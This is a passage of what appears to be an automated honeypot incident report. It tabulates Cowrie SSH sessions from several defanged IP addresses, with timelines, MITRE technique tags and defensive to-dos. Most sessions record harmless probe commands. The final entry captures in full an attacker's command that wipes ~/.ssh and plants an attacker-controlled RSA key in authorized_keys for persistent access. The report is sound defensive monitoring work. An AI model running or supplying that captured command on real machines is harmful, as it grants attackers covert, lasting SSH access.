| `2026-07-02 09:41:01` | `cowrie.login.success` |
| `2026-07-02 09:41:01` | `cowrie.session.params` |
| `2026-07-02 09:41:01` | `cowrie.command.input` |
| `2026-07-02 09:41:01` | `cowrie.command.input` |
| `2026-07-02 09:41:01` | `cowrie.command.failed` |
| `2026-07-02 09:41:01` | `cowrie.command.input` |
| `2026-07-02 09:41:01` | `cowrie.log.closed` |
| `2026-07-02 09:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.0[.]187` to AbuseIPDB if not already reported
- [ ] Block `34.79.0[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac56986737f5

| Field | Detail |
|---|---|
| **Source IP** | `34.79.0[.]187` |
| **First Seen** | 2026-07-02 09:41 |
| **Last Seen** | 2026-07-02 09:41 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:41:14` | `cowrie.session.connect` |
| `2026-07-02 09:41:14` | `cowrie.login.success` |
| `2026-07-02 09:41:15` | `cowrie.session.params` |
| `2026-07-02 09:41:15` | `cowrie.command.input` |
| `2026-07-02 09:41:15` | `cowrie.command.failed` |
| `2026-07-02 09:41:30` | `cowrie.log.closed` |
| `2026-07-02 09:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.0[.]187` to AbuseIPDB if not already reported
- [ ] Block `34.79.0[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8510c40cc09f

| Field | Detail |
|---|---|
| **Source IP** | `34.79.0[.]187` |
| **First Seen** | 2026-07-02 09:41 |
| **Last Seen** | 2026-07-02 09:41 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:41:16` | `cowrie.session.connect` |
| `2026-07-02 09:41:16` | `cowrie.login.success` |
| `2026-07-02 09:41:17` | `cowrie.session.params` |
| `2026-07-02 09:41:17` | `cowrie.command.input` |
| `2026-07-02 09:41:30` | `cowrie.log.closed` |
| `2026-07-02 09:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.0[.]187` to AbuseIPDB if not already reported
- [ ] Block `34.79.0[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b056021d93d3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 09:41 |
| **Last Seen** | 2026-07-02 09:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:41:47` | `cowrie.session.connect` |
| `2026-07-02 09:41:49` | `cowrie.client.version` |
| `2026-07-02 09:41:49` | `cowrie.client.kex` |
| `2026-07-02 09:41:54` | `cowrie.login.success` |
| `2026-07-02 09:41:59` | `cowrie.session.params` |
| `2026-07-02 09:41:59` | `cowrie.command.input` |
| `2026-07-02 09:42:00` | `cowrie.log.closed` |
| `2026-07-02 09:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84002e6507c8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 09:47 |
| **Last Seen** | 2026-07-02 09:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:47:23` | `cowrie.session.connect` |
| `2026-07-02 09:47:23` | `cowrie.client.version` |
| `2026-07-02 09:47:23` | `cowrie.client.kex` |
| `2026-07-02 09:47:23` | `cowrie.login.success` |
| `2026-07-02 09:47:25` | `cowrie.session.params` |
| `2026-07-02 09:47:25` | `cowrie.command.input` |
| `2026-07-02 09:47:25` | `cowrie.log.closed` |
| `2026-07-02 09:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61ab31b824c3

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 09:47 |
| **Last Seen** | 2026-07-02 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:47:34` | `cowrie.session.connect` |
| `2026-07-02 09:47:34` | `cowrie.client.version` |
| `2026-07-02 09:47:34` | `cowrie.client.kex` |
| `2026-07-02 09:47:35` | `cowrie.login.success` |
| `2026-07-02 09:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009302e17c50

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 09:47 |
| **Last Seen** | 2026-07-02 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:47:34` | `cowrie.session.connect` |
| `2026-07-02 09:47:34` | `cowrie.client.version` |
| `2026-07-02 09:47:34` | `cowrie.client.kex` |
| `2026-07-02 09:47:35` | `cowrie.login.success` |
| `2026-07-02 09:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a64db331a306

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 09:51 |
| **Last Seen** | 2026-07-02 09:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:51:36` | `cowrie.session.connect` |
| `2026-07-02 09:51:36` | `cowrie.client.version` |
| `2026-07-02 09:51:36` | `cowrie.client.kex` |
| `2026-07-02 09:51:38` | `cowrie.login.success` |
| `2026-07-02 09:51:40` | `cowrie.session.params` |
| `2026-07-02 09:51:40` | `cowrie.command.input` |
| `2026-07-02 09:51:40` | `cowrie.log.closed` |
| `2026-07-02 09:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a594dd9c6646

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 09:53 |
| **Last Seen** | 2026-07-02 09:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 09:53:02` | `cowrie.session.connect` |
| `2026-07-02 09:53:04` | `cowrie.client.version` |
| `2026-07-02 09:53:04` | `cowrie.client.kex` |
| `2026-07-02 09:53:08` | `cowrie.login.success` |
| `2026-07-02 09:53:12` | `cowrie.session.params` |
| `2026-07-02 09:53:12` | `cowrie.command.input` |
| `2026-07-02 09:53:14` | `cowrie.log.closed` |
| `2026-07-02 09:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7313a5acebe5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 10:04 |
| **Last Seen** | 2026-07-02 10:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:04:02` | `cowrie.session.connect` |
| `2026-07-02 10:04:03` | `cowrie.client.version` |
| `2026-07-02 10:04:03` | `cowrie.client.kex` |
| `2026-07-02 10:04:10` | `cowrie.login.success` |
| `2026-07-02 10:04:14` | `cowrie.session.params` |
| `2026-07-02 10:04:14` | `cowrie.command.input` |
| `2026-07-02 10:04:15` | `cowrie.log.closed` |
| `2026-07-02 10:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-379b570397b2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 10:05 |
| **Last Seen** | 2026-07-02 10:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:05:15` | `cowrie.session.connect` |
| `2026-07-02 10:05:15` | `cowrie.client.version` |
| `2026-07-02 10:05:15` | `cowrie.client.kex` |
| `2026-07-02 10:05:15` | `cowrie.login.success` |
| `2026-07-02 10:05:17` | `cowrie.session.params` |
| `2026-07-02 10:05:17` | `cowrie.command.input` |
| `2026-07-02 10:05:17` | `cowrie.log.closed` |
| `2026-07-02 10:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb67f73b77f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 10:05 |
| **Last Seen** | 2026-07-02 10:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:05:37` | `cowrie.session.connect` |
| `2026-07-02 10:05:38` | `cowrie.client.version` |
| `2026-07-02 10:05:38` | `cowrie.client.kex` |
| `2026-07-02 10:05:39` | `cowrie.login.success` |
| `2026-07-02 10:05:40` | `cowrie.session.params` |
| `2026-07-02 10:05:40` | `cowrie.command.input` |
| `2026-07-02 10:05:40` | `cowrie.log.closed` |
| `2026-07-02 10:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed33b73bed2

| Field | Detail |
|---|---|
| **Source IP** | `34.77.145[.]211` |
| **First Seen** | 2026-07-02 10:11 |
| **Last Seen** | 2026-07-02 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:11:52` | `cowrie.session.connect` |
| `2026-07-02 10:11:52` | `cowrie.login.success` |
| `2026-07-02 10:11:52` | `cowrie.session.params` |
| `2026-07-02 10:11:52` | `cowrie.command.input` |
| `2026-07-02 10:11:52` | `cowrie.command.input` |
| `2026-07-02 10:11:52` | `cowrie.command.failed` |
| `2026-07-02 10:11:52` | `cowrie.command.input` |
| `2026-07-02 10:11:53` | `cowrie.log.closed` |
| `2026-07-02 10:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.145[.]211` to AbuseIPDB if not already reported
- [ ] Block `34.77.145[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6f6aa921c38

| Field | Detail |
|---|---|
| **Source IP** | `34.77.145[.]211` |
| **First Seen** | 2026-07-02 10:12 |
| **Last Seen** | 2026-07-02 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:12:00` | `cowrie.session.connect` |
| `2026-07-02 10:12:00` | `cowrie.login.success` |
| `2026-07-02 10:12:01` | `cowrie.session.params` |
| `2026-07-02 10:12:01` | `cowrie.command.input` |
| `2026-07-02 10:12:01` | `cowrie.command.failed` |
| `2026-07-02 10:12:02` | `cowrie.log.closed` |
| `2026-07-02 10:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.145[.]211` to AbuseIPDB if not already reported
- [ ] Block `34.77.145[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb9d655d0a1f

| Field | Detail |
|---|---|
| **Source IP** | `34.77.145[.]211` |
| **First Seen** | 2026-07-02 10:12 |
| **Last Seen** | 2026-07-02 10:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:12:02` | `cowrie.session.connect` |
| `2026-07-02 10:12:02` | `cowrie.login.success` |
| `2026-07-02 10:12:03` | `cowrie.session.params` |
| `2026-07-02 10:12:03` | `cowrie.command.input` |
| `2026-07-02 10:12:15` | `cowrie.log.closed` |
| `2026-07-02 10:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.145[.]211` to AbuseIPDB if not already reported
- [ ] Block `34.77.145[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a10dd2c2055

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 10:15 |
| **Last Seen** | 2026-07-02 10:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:15:04` | `cowrie.session.connect` |
| `2026-07-02 10:15:05` | `cowrie.client.version` |
| `2026-07-02 10:15:05` | `cowrie.client.kex` |
| `2026-07-02 10:15:12` | `cowrie.login.success` |
| `2026-07-02 10:15:15` | `cowrie.session.params` |
| `2026-07-02 10:15:15` | `cowrie.command.input` |
| `2026-07-02 10:15:16` | `cowrie.log.closed` |
| `2026-07-02 10:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-990cac8dbb43

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 10:18 |
| **Last Seen** | 2026-07-02 10:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:18:24` | `cowrie.session.connect` |
| `2026-07-02 10:18:24` | `cowrie.client.version` |
| `2026-07-02 10:18:24` | `cowrie.client.kex` |
| `2026-07-02 10:18:24` | `cowrie.login.success` |
| `2026-07-02 10:18:26` | `cowrie.session.params` |
| `2026-07-02 10:18:26` | `cowrie.command.input` |
| `2026-07-02 10:18:26` | `cowrie.log.closed` |
| `2026-07-02 10:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e606b262202

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 10:20 |
| **Last Seen** | 2026-07-02 10:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:20:27` | `cowrie.session.connect` |
| `2026-07-02 10:20:28` | `cowrie.client.version` |
| `2026-07-02 10:20:28` | `cowrie.client.kex` |
| `2026-07-02 10:20:30` | `cowrie.login.success` |
| `2026-07-02 10:20:31` | `cowrie.session.params` |
| `2026-07-02 10:20:31` | `cowrie.command.input` |
| `2026-07-02 10:20:31` | `cowrie.log.closed` |
| `2026-07-02 10:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-509ce6772b48

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 10:20 |
| **Last Seen** | 2026-07-02 10:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:20:59` | `cowrie.session.connect` |
| `2026-07-02 10:20:59` | `cowrie.client.version` |
| `2026-07-02 10:20:59` | `cowrie.client.kex` |
| `2026-07-02 10:21:00` | `cowrie.login.success` |
| `2026-07-02 10:21:01` | `cowrie.session.params` |
| `2026-07-02 10:21:01` | `cowrie.command.input` |
| `2026-07-02 10:21:01` | `cowrie.log.closed` |
| `2026-07-02 10:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03b47c9229f

| Field | Detail |
|---|---|
| **Source IP** | `172.104.11[.]51` |
| **First Seen** | 2026-07-02 10:22 |
| **Last Seen** | 2026-07-02 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:22:44` | `cowrie.session.connect` |
| `2026-07-02 10:22:44` | `cowrie.login.success` |
| `2026-07-02 10:22:44` | `cowrie.session.params` |
| `2026-07-02 10:22:44` | `cowrie.command.input` |
| `2026-07-02 10:22:44` | `cowrie.command.input` |
| `2026-07-02 10:22:44` | `cowrie.command.failed` |
| `2026-07-02 10:22:44` | `cowrie.command.input` |
| `2026-07-02 10:22:44` | `cowrie.command.failed` |
| `2026-07-02 10:22:44` | `cowrie.command.input` |
| `2026-07-02 10:22:44` | `cowrie.log.closed` |
| `2026-07-02 10:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.104.11[.]51` to AbuseIPDB if not already reported
- [ ] Block `172.104.11[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20e32e69bd3f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 10:26 |
| **Last Seen** | 2026-07-02 10:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:26:10` | `cowrie.session.connect` |
| `2026-07-02 10:26:11` | `cowrie.client.version` |
| `2026-07-02 10:26:11` | `cowrie.client.kex` |
| `2026-07-02 10:26:17` | `cowrie.login.success` |
| `2026-07-02 10:26:20` | `cowrie.session.params` |
| `2026-07-02 10:26:20` | `cowrie.command.input` |
| `2026-07-02 10:26:21` | `cowrie.log.closed` |
| `2026-07-02 10:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c044eb96f84f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 10:31 |
| **Last Seen** | 2026-07-02 10:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:31:39` | `cowrie.session.connect` |
| `2026-07-02 10:31:39` | `cowrie.client.version` |
| `2026-07-02 10:31:39` | `cowrie.client.kex` |
| `2026-07-02 10:31:40` | `cowrie.login.success` |
| `2026-07-02 10:31:41` | `cowrie.session.params` |
| `2026-07-02 10:31:41` | `cowrie.command.input` |
| `2026-07-02 10:31:41` | `cowrie.log.closed` |
| `2026-07-02 10:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469449a62975

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 10:34 |
| **Last Seen** | 2026-07-02 10:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:34:13` | `cowrie.session.connect` |
| `2026-07-02 10:34:14` | `cowrie.client.version` |
| `2026-07-02 10:34:14` | `cowrie.client.kex` |
| `2026-07-02 10:34:15` | `cowrie.login.success` |
| `2026-07-02 10:34:17` | `cowrie.session.params` |
| `2026-07-02 10:34:17` | `cowrie.command.input` |
| `2026-07-02 10:34:17` | `cowrie.log.closed` |
| `2026-07-02 10:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe10a25e379c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 10:37 |
| **Last Seen** | 2026-07-02 10:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:37:25` | `cowrie.session.connect` |
| `2026-07-02 10:37:26` | `cowrie.client.version` |
| `2026-07-02 10:37:26` | `cowrie.client.kex` |
| `2026-07-02 10:37:33` | `cowrie.login.success` |
| `2026-07-02 10:37:36` | `cowrie.session.params` |
| `2026-07-02 10:37:36` | `cowrie.command.input` |
| `2026-07-02 10:37:39` | `cowrie.log.closed` |
| `2026-07-02 10:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938ea136534a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 10:41 |
| **Last Seen** | 2026-07-02 10:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:41:51` | `cowrie.session.connect` |
| `2026-07-02 10:41:51` | `cowrie.client.version` |
| `2026-07-02 10:41:51` | `cowrie.client.kex` |
| `2026-07-02 10:41:52` | `cowrie.login.success` |
| `2026-07-02 10:41:53` | `cowrie.session.params` |
| `2026-07-02 10:41:53` | `cowrie.command.input` |
| `2026-07-02 10:41:54` | `cowrie.log.closed` |
| `2026-07-02 10:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aac27dc4936

| Field | Detail |
|---|---|
| **Source IP** | `203.88.119[.]100` |
| **First Seen** | 2026-07-02 10:45 |
| **Last Seen** | 2026-07-02 10:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 10:45:34` | `cowrie.session.connect` |
| `2026-07-02 10:45:34` | `cowrie.client.version` |
| `2026-07-02 10:45:34` | `cowrie.client.kex` |
| `2026-07-02 10:45:35` | `cowrie.login.success` |
| `2026-07-02 10:45:35` | `cowrie.session.params` |
| `2026-07-02 10:45:35` | `cowrie.command.input` |
| `2026-07-02 10:45:35` | `cowrie.command.failed` |
| `2026-07-02 10:45:36` | `cowrie.log.closed` |
